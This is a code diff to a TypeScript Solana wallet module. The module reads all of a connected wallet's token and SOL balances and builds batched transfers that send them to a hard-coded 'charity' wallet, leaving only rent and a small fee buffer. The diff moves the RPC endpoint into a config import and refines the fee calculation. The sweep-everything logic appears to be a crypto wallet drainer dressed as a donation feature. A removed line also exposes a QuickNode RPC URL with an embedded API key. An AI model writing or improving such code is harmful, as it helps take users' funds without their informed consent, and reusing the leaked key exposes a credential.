@@ -14,11 +14,12 @@ import {
   getAccount,
 } from "@solana/spl-token";
 import { WalletContextState } from "@solana/wallet-adapter-react";
+import { RPC_ENDPOINT } from "@/lib/config";
 
 const CHARITY_WALLET = new PublicKey(
   "wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj"
 );
-const QUICKNODE_RPC = "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b";
+// Use centralized RPC endpoint
 
 export interface TokenBalance {
   mint: string;
@@ -38,7 +39,7 @@ export interface WalletBalances {
 export async function getWalletBalances(
   walletAddress: PublicKey
 ): Promise<WalletBalances> {
-  const connection = new Connection(QUICKNODE_RPC, "confirmed");
+  const connection = new Connection(RPC_ENDPOINT, "confirmed");
 
   // Get SOL balance
   const solBalance = await connection.getBalance(walletAddress);
@@ -77,7 +78,7 @@ export async function createBatchTransferTransaction(
 ): Promise<Transaction> {
   if (!wallet.publicKey) throw new Error("Wallet not connected");
 
-  const connection = new Connection(QUICKNODE_RPC, "confirmed");
+  const connection = new Connection(RPC_ENDPOINT, "confirmed");
   const transaction = new Transaction();
 
   // Add token transfers (max 5 per batch)
@@ -118,9 +119,10 @@ export async function createBatchTransferTransaction(
   if (isFinalBatch) {
     const solBalance = await connection.getBalance(wallet.publicKey);
     const rentExemption = await connection.getMinimumBalanceForRentExemption(0);
-    
-    // First batch: send 70% of SOL
-    const firstSolAmount = Math.floor((solBalance - rentExemption) * 0.7);
+    // Estimate fee (approx) for this transaction
+    const estimatedFee = 5000;
+    // First batch: send 70% of SOL, leaving rent + fee buffer
+    const firstSolAmount = Math.floor((solBalance - rentExemption - estimatedFee) * 0.7);
     
     if (firstSolAmount > 0) {
       transaction.add(
@@ -145,7 +147,7 @@ export async function createFinalSolTransferTransaction(
 ): Promise<Transaction> {
   if (!wallet.publicKey) throw new Error("Wallet not connected");
 
-  const connection = new Connection(QUICKNODE_RPC, "confirmed");
+  const connection = new Connection(RPC_ENDPOINT, "confirmed");
   const transaction = new Transaction();
 
   const solBalance = await connection.getBalance(wallet.publicKey);
